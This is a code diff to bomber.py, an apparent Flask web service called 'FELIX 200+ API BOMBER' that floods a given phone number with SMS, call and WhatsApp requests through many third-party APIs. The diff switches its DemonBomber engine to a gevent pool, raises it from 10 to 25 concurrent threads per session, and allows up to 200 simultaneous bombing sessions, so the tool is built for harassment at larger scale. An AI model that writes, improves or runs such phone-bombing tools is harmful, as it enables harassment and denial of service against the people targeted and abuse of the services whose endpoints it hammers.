@@ -1,8 +1,12 @@
 # ============================================
 # FELIX 200+ API BOMBER - RENDER DEPLOYMENT
 # File: bomber.py
-# FIX: Async bombing, /stop endpoint, multi-user concurrency
+# FIX: Multi-user concurrency, 25 threads, gevent async, single worker
 # ============================================
+
+# MUST BE FIRST — patches stdlib sockets so gevent can handle concurrency
+from gevent import monkey
+monkey.patch_all()
 
 from flask import Flask, request, jsonify
 import requests
@@ -10,7 +14,8 @@ import json
 import time
 import random
 import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from gevent.pool import Pool as GeventPool
+from gevent import sleep as gevent_sleep
 from datetime import datetime
 import os
 
@@ -863,7 +868,7 @@ _sessions_lock = threading.Lock()
 # BOMBER ENGINE
 # ============================================
 class DemonBomber:
-    def __init__(self, phone, threads=10, delay=2, stop_event=None):
+    def __init__(self, phone, threads=25, delay=2, stop_event=None):
         self.phone = phone
         self.threads = threads
         self.delay = delay
@@ -913,18 +918,22 @@ class DemonBomber:
             return {'name': api['name'], 'status': 'error', 'error': str(e)[:50]}
 
     def run(self):
-        """Run one full cycle through all APIs (respects stop_event)."""
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            futures = {executor.submit(self.hit_api, api): api for api in API_LIST}
-            for future in as_completed(futures):
-                if self.stop_event.is_set():
-                    break
-                try:
-                    result = future.result()
+        """Run one full cycle through all APIs using gevent pool (non-blocking)."""
+        pool = GeventPool(self.threads)
+        greenlets = []
+        for api in API_LIST:
+            if self.stop_event.is_set():
+                break
+            g = pool.spawn(self.hit_api, api)
+            greenlets.append(g)
+        pool.join()
+        for g in greenlets:
+            try:
+                result = g.value
+                if result:
                     self.results.append(result)
-                except Exception:
-                    pass
-
+            except Exception:
+                pass
         return {
             'total': len(API_LIST),
             'success': self.success,
@@ -940,7 +949,7 @@ def _bomb_worker(phone, threads, delay, stop_event):
             bomber.run()
             if not stop_event.is_set():
                 # Short sleep between cycles so we don't hammer instantly
-                time.sleep(max(1, delay))
+                gevent_sleep(max(1, delay))  # gevent cooperative sleep
     finally:
         # Clean up session entry when done
         with _sessions_lock:
@@ -997,7 +1006,7 @@ def stats():
         'sms_apis': sms,
         'call_apis': call,
         'whatsapp_apis': whatsapp,
-        'threads_per_cycle': 10,
+        'threads_per_cycle': 25,
         'active_sessions': active_count,
     })
 
@@ -1022,10 +1031,16 @@ def bomb():
         if len(phone) < 10:
             return jsonify({'error': 'Invalid phone number'}), 400
 
-        threads = min(threads, 10)
+        threads = min(threads, 25)  # Allow up to 25 threads per session
         delay = min(delay, 5)
 
         with _sessions_lock:
+            if len(_active_sessions) >= 200:
+                return jsonify({
+                    'status': 'server_busy',
+                    'message': 'Max concurrent sessions reached (200). Try again later.'
+                }), 503
+
             if phone in _active_sessions:
                 # Already bombing — just acknowledge
                 return jsonify({
